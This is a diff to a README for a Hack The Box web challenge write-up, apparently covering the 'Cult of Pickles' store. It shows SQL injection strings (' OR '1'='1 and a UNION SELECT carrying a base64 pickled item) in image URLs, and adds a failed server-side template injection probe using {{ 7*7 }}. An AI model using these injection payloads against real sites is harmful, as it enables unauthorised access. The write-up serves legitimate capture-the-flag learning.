@@ -1,4 +1,4 @@
-![localhost_1337_view_%27%20OR%20%271%27%3D%271](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/4f9117b9-6dc8-4ac6-befd-6b8416fc5cc3)# HTB-Challenges-Web-COP
+# HTB-Challenges-Web-COP
 
 ## Challenge Description
 The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!
@@ -74,3 +74,19 @@ With the encoded item in hand, my next step is to showcase it in the application
 ```
 
 ![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVbgAAAAAAAAB9lCiMBG5hbWWUjAlTb21lIG5hbWWUjAtkZXNjcmlwdGlvbpSMEFNvbWUgZGVzY3JpcHRpb26UjAVwcmljZZSMAzEwMJSMBWltYWdllIwcL3N0YXRpYy9pbWFnZXMvbm90X2ZvdW5kLmpwZ5R1Lg%3D%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/25844325-c408-4ac3-b16f-4ab560be673f)
+
+## Exploitation 1 - SSTI *(Failed)*
+Now that I have a way to inject a payload that controls the application's dynamic aspects, I can attempt various vulnerabilities to read the flag. The first vulnerability to test is SSTI, so I will create a payload to confirm if the application is susceptible to it.
+
+```py
+evil_item = {
+    "name": "{{ 7*7 }}",
+    "description": "{{ 7*7 }}",
+    "price": "{{ 7*7 }}",
+    "image": "{{ 7*7 }}",
+}
+```
+
+Unfortunately for me, it's not.
+
+![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVPAAAAAAAAAB9lCiMBG5hbWWUjAl7eyA3KjcgfX2UjAtkZXNjcmlwdGlvbpRoAowFcHJpY2WUaAKMBWltYWdllGgCdS4%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/592b423b-3ffb-4527-bb7b-61531f661947)
